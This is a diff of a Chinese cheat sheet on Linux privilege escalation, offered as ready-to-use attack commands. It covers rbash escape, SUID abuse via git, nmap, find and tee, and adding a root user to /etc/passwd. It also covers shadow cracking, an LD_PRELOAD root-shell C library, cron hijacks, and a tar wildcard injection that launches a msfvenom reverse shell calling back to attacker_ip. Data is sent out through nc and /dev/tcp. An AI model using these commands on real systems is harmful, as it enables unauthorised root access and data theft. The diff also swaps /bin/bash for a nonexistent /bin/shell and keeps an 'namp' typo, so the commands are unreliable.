@@ -10,28 +10,28 @@ description = "Linux常见提权方法"
 
 ### 终端升级
 
-```bash
-python -c 'import pty;pty.spawn("/bin/bash")'
+```shell
+python -c 'import pty;pty.spawn("/bin/shell")'
 stty raw -echo
 export TERM=xterm-color
 ```
 
 使用rlwrap修复方向键乱码问题
 
-```bash
+```shell
 rlwrap nc -lvnp 443
 ```
 
 ### rbash逃逸
 
-```bash
-BASH_CMDS[a]=/bin/bash;a    # BASH_CMDS是个键值对对象，中存储着命令对应的地址，这里把bash的地址赋给a，再运行
+```shell
+BASH_CMDS[a]=/bin/shell;a    # BASH_CMDS是个键值对对象，中存储着命令对应的地址，这里把bash的地址赋给a，再运行
 export PATH=$PATH:/bin/
 export PATH=$PATH:/usr/bin  # 修复环境变量
 ```
 
 ## 手动枚举
-```bash
+```shell
 # 用户枚举
 who     # 列出当前所有登录的用户的信息
 w       # who详细版
@@ -75,32 +75,42 @@ curl <url> | sh     # 直接执行在线脚本
 ## 便捷命令
 
 ### 建立一个简易服务器
-```bash
+
+```shell
 sudo python3 -m http.server port
 ```
 
 ### 无curl命令传文件(利用伪设备)
+
 攻击机执行：
-```bash
+
+```shell
 nc -lvnp port < file.sh
 ```
+
 靶机执行：
-```bash
+
+```shell
 cat < /dev/tcp/attacker_ip/port # 后可拼接重定向/sh命令
 ```
 
 ### 靶机命令结果传回
+
 靶机执行：
-```bash
+
+```shell
 命令 | nc attacker_ip port
 ```
+
 攻击机执行：
-```bash
+
+```shell
 nc -lvnp port | tee result.txt  # tee命令将数据分流，同时输出到标准输出和文件中
 ```
 
 ### 原样输出控制字符
-```bash
+
+```shell
 less -r result.txt
 ```
 
@@ -108,39 +118,49 @@ less -r result.txt
 
 ### 查找所有具有SUID位的文件
 
-```bash
+```shell
 find / -perm -u=s -type f 2>/dev/null
 ```
 
 ### 提权方法
 
 ### git 提权
-```bash
+
+```shell
 sudo git help config
 ```
-使 git 被动调用 more 进行显示，再输入 `!/bin/bash` 即可提权
+
+使 `git` 被动调用 `more` 进行显示，再输入 `!/bin/shell` 即可提权
 
 ### nmap提权
+
 - 老版本
-```bash
+
+```shell
+
 namp --interactive
 !sh
 ```
+
 - 新版本
-```bash
-echo "os.execute('/bin/bash')" > demon.nse
+
+```shell
+echo "os.execute('/bin/shell')" > demon.nse
 nmap --script=demon.nse
 ```
 
 ### find提权
-```bash
-find . -exec /bin/bash -p \;
+
+```shell
+find . -exec /bin/shell -p \;
 ```
 
 ### tee提权
-tee可以向文件追加写入内容，向passwd中添加新的root用户，再切换到新用户即可完成提权
-```bash
-echo "test::0:0:: :/bin/bash" | sudo tee -a /etc/passwd
+
+`tee`可以向文件追加写入内容，向`passwd`中添加新的root用户，再切换到新用户即可完成提权
+
+```shell
+echo "test::0:0:: :/bin/shell" | sudo tee -a /etc/passwd
 ```
 
 ## 服务漏洞提权
@@ -150,13 +170,13 @@ echo "test::0:0:: :/bin/bash" | sudo tee -a /etc/passwd
 提权条件：
 
 1. 必须掌握一个具有创建/使用函数权限的MySQL账户
-2. secure_file_priv 权限必须为空('')，除非指定的目录恰好就是我们在提权过程中用到的目录(如plugin目录)。该权限用于限制Load data、select into outfile、load_file()操作
+2. secure_file_priv 权限必须为空('')，除非指定的目录恰好就是我们在提权过程中用到的目录(如plugin目录)。该权限用于限制`Load data`、`select into outfile`、`load_file()`操作
 
 提权原理：定义能够以高权限执行系统命令的函数，将该函数导入到数据库中，通过MySQL数据库执行系统命令以实现提权
 
 searchsploit搜索udf利用exploit
 
-```bash
+```shell
 searchsploit mysql udf
 ```
 
@@ -197,48 +217,48 @@ select your_func('command');
 
 ### 可读shadow文件利用提权
 
-要求shadow文件可读
-从shadow中提取密码哈希
+要求`shadow`文件可读
+从`shadow`中提取密码哈希
 
-```bash
+```shell
 cat /etc/shadow | grep ':\$'
 ```
 
 使用john破解
 
-```bash
+```shell
 sudo john --wordlist=/your/dict/path hash.txt
 ```
 
 ### 可写shadow文件利用提权
 
-要求shadow文件可写
-首先备份shadow文件(重要)  
+要求`shadow`文件可写
+首先备份`shadow`文件(重要)  
 生成sha-512算法的密码哈希
 
-```bash
+```shell
 mkpasswd -m sha-512 PassWord
 ```
 
-将生成的新密码替换shadow文件中的旧密码即可生效
+将生成的新密码替换`shadow`文件中的旧密码即可生效
 
 ### 可写passwd文件利用提权
 
-要求passwd文件可写  
-首先备份passwd文件(重要)
-使用openssl生成哈希
+要求`passwd`文件可写  
+首先备份`passwd`文件(重要)
+使用`openssl`生成哈希
 
-```bash
+```shell
 openssl passwd hacker
 ```
 
-将passwd中的x替换为生成的哈希，即可生效
+将`passwd`中的`x`替换为生成的哈希，即可生效
 
 ## sudo环境变量提权
 
 查看当前用户能执行哪些sudo命令
 
-```bash
+```shell
 sudo -l
 ```
 
@@ -264,7 +284,7 @@ void _init(){
     unsetenv("LD_PRELOAD"); // 清除当前进程环境变量中的 LD_PRELOAD
     setgid(0);              // 显式调用以确保彻底变为root权限
     setuid(0);
-    system("/bin/bash");    // 启动一个系统终端
+    system("/bin/shell");    // 启动一个系统终端
 }
 ```
 
@@ -278,12 +298,89 @@ void _init(){
 
 `-nostartfiles`：不链接系统标准启动文件。放置符号冲突
 
-```bash
+```shell
 gcc -fPIC -shared -o shell.so shell.c -nostartfiles
 ```
 
-编译后得到shell.so动态链接库，执行一个免密sudo执行的命令(这里以find为例)，在之前定义LD_PRELOAD为编译好的so库，那么就会在执行find前加载so库中的代码，进而执行一个root权限的bash
+编译后得到`shell.so`动态链接库，执行一个免密sudo执行的命令(这里以find为例)，在之前定义`LD_PRELOAD`为编译好的so库，那么就会在执行find前加载so库中的代码，进而执行一个root权限的bash
 
-```bash
+```shell
 sudo LD_PRELOAD=/home/user/shell.so find
 ```
+
+## 自动任务提权
+
+查看自动任务
+
+```shell
+cat /etc/crontab
+```
+
+### 自动任务文件提权
+
+提权条件：`command`所指定的文件可写  
+原理：假设存在一个自动任务`overwrite.sh`，且拥有写入该文件的权限，那么可以修改其内容使其反弹shell给我们  
+例如有下面的配置：
+
+```text
+* * * * * root overwrite.sh
+```
+
+如果我们有`overwrite.sh`的写权限，那么就可以将其改造为提权脚本
+
+### 自动任务PATH环境变量提权
+
+提权条件：command使用相对路径，且PATH中前面的目录中存在可写目录  
+原理：crontab会在`PATH`变量定义的目录中从左向右依次寻找command位置，如果我们能在正常command前的目录内定义一个我们自己的command，那么就能通过环境变量劫持提权
+例如有以下配置：
+
+```text
+………………
+PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+………………
+* * * * * root overwrite.sh
+```
+
+注意到overwrite.sh使用的是相对路径，那么我们就可以在PATH中靠前的目录中(如`/home/user`)创建一个同名文件并写入提权命令
+
+### 自动任务通配符提权
+
+例如存在一个这样的定时任务：
+
+```bash
+cd /home/user
+tar czf /tmp/backup.tar.gz *
+```
+
+首先生成一个后门并传输到靶机
+
+```shell
+sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=attacker_port -f elf -o shell.elf
+```
+
+在攻击机上开启监听
+
+```shell
+sudo nc -lvnp 4444
+```
+
+在`/home/user`下建创建文件：
+
+```shell
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=shell.elf
+```
+
+等定时任务触发时就会反弹一个root shell
+
+原理：Shell会把`*`展开为当前目录下所有文件的名称，然后才将展开后的完整列表交给`tar`执行，所以tar实际收到的参数是：
+
+```shell
+tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=shell.elf 其它正常文件……
+```
+
+`tar`在解释参数时，会将`--`开头的字符串视为**选项**，而不是待归档的文件。  
+`--checkpoint=1`: 指示`tar`每处理1条记录就触发一次“检查点”。
+`--checkpoint-action=exec=shell.elf`: 指定在每次触发检查点时。执行(`exec`)指定的程序，即`shell.elf`  
+所以`tar`就会在归档文件时触发检查点，执行shell.elf，反弹回一个shell。
+
